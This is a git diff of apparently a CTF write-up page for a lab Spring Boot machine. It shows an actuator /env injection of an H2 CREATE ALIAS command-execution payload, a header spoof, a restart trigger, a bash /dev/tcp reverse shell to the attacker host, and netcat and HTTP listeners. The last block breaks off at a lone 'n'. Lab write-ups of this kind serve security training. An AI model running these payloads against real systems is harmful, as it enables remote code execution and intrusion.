@@ -121,49 +121,45 @@ git diff 92b433a86a015517f746a3437ba3802be9146722 1a83ec34bf5ab3a89096346c46f6fd
 
 [https://gist.github.com/10urshin/b88cfcd2f0ff49e343dfbc44cc89ebdb](https://gist.github.com/10urshin/b88cfcd2f0ff49e343dfbc44cc89ebdb)
 
-**Kali**
+**Kali #1**
 
 ```
-python2 -m SimpleHTTPServer 81
+tcpdump -i ens5 icmp
 ```
 
-**Kali**
+**Kali #2**
 
 ```
-curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' --data-binary $'{\"name\":\"spring.datasource.hikari.connection-test-query\",\"value\":\"CREATEALIAS EXEC AS CONCAT(\'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new\',\'java.util.Scanner(Runtime.getRun\',\'time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }\');CALL EXEC(\'ping -c 5 10.10.218.146\');\"}' "https://10.10.154.214/actuator/env" -k
-curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' "https://10.10.154.214/actuator/restart" -k
+curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' --data-binary $'{\"name\":\"spring.datasource.hikari.connection-test-query\",\"value\":\"CREATE ALIAS EXEC AS CONCAT(\'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new\',\' java.util.Scanner(Runtime.getRun\',\'time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }\');CALL EXEC(\'ping -c 5 $KALI\');\"}' "https://$VICTIM/actuator/env" -k
+
+curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' "https://$VICTIM/actuator/restart" -k
 ```
 
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
-
-**Burp**
+**revese.sh**
 
 ```
-POST /actuator/env HTTP/1.1
-Host: spring.thm
-Cookie: JSESSIONID=9398A5BFECFB4A8DB0AAF876A4B8E9A4
-User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0
-X-Forwarded-For: 172.16.0.2
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Upgrade-Insecure-Requests: 1
-Sec-Fetch-Dest: document
-Sec-Fetch-Mode: navigate
-Sec-Fetch-Site: none
-Sec-Fetch-User: ?1
-Te: trailers
-Connection: close
-Content-Length: 376
-
-{"name":"spring.datasource.hikari.connection-test-query","value":"CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new',' java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream());  if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL EXEC('curl  http://$KALI:81');"}
+bash -c "bash -i >& /dev/tcp/$KALI/9000 0>&1"
 ```
 
-<figure><img src="../../.gitbook/assets/image (474).png" alt=""><figcaption></figcaption></figure>
+**Kali #1**
 
-We can see the connection back to Kali worked
+```
+python3 -m http.server 81
+```
 
-<figure><img src="../../.gitbook/assets/image (475).png" alt=""><figcaption></figcaption></figure>
+**Kali #2**
+
+```
+nc -lvnp 9000
+```
+
+**Kali #3**
+
+```
+n
+```
 
 
 
